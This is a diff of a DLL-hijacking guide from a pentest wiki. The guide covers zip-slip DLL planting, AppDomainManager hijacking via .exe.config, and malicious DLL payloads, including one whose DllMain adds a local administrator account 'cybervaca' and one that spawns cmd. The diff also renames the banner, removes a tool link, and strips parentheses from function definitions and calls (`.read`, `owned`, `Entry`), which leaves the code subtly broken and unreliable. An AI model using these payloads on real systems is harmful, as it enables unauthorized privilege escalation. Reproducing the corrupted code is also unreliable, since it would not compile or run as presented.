@@ -1,6 +1,6 @@
 # DLL Hijacking
 
-{{#include ../../../banners/hacktricks-training.md}}
+{{#include ../../../banners/this collection-training.md}}
 
 
 ## Basic Information
@@ -178,7 +178,7 @@ There are other ways to alter the ways to alter the search order but I'm not goi
 ```python
 import zipfile
 with zipfile.ZipFile("slip-shell.zip", "w") as z:
-    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
+    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read)
 ```
 
 5. Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account.
@@ -283,12 +283,12 @@ This technique has been observed in-the-wild to drive multi-stage sideloading ch
 
 ### .NET AppDomainManager hijacking via `.exe.config`
 
-For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.
+For **.NET Framework** targets, sideloading can be done **before `Main`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.
 
 How the chain works:<sup>[[15]](#references)[[22]](#references)</sup>
 1. The host EXE starts and the **CLR reads `<exe>.config`**.
 2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
-3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
+3. The malicious manager gets **pre-`Main` execution** inside the trusted host process.
 4. The same config can force the CLR to resolve local assemblies first (for example `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) and can weaken runtime validation/telemetry without inline patching.
 
 Campaign-style pattern (exact nesting can vary by directive / CLR version):
@@ -377,7 +377,7 @@ writable-sys-path-dll-hijacking-privesc.md
 
 ### Automated tools
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
+[**Winpeas** ]will check if you have write permissions on any folder inside system PATH.\
 Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._
 
 ### Example
@@ -466,7 +466,7 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 #include <windows.h>
 
-int owned()
+int owned
 {
   WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
   exit(0);
@@ -475,7 +475,7 @@ int owned()
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 {
-  owned();
+  owned;
   return 0;
 }
 ```
@@ -493,7 +493,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 #include<stdlib.h>
 #include<stdio.h>
 
-void Entry (){ //Default function that is executed when the DLL is loaded
+void Entry { //Default function that is executed when the DLL is loaded
     system("cmd");
 }
 
@@ -767,4 +767,4 @@ Defensive pivots
 - [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
 - [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
 
-{{#include ../../../banners/hacktricks-training.md}}
+{{#include ../../../banners/this collection-training.md}}
